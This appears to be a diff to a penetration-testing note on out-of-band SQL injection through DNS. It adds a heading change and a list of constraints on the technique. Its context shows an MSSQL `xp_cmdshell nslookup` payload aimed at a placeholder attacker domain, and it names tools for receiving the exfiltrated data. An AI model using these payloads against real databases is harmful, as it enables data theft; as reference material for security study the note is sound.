@@ -276,6 +276,13 @@ Uses LOAD_FILE() to trigger DNS lookup.
 
 `EXEC xp_cmdshell 'nslookup data.attacker.com';`
 
-# Receiving the Data
+### Receiving the Data
 
 Burp Collaborator, Interactsh, python dnslib custom server, bare-bones HTTP Server.
+
+#### Constraints
+
+1. Most databases restring outband network access.
+2. Different databases, different payloads.
+3. Characters limitation of 63 for dns exfiltration.
+4. Slower than pulling data directly.
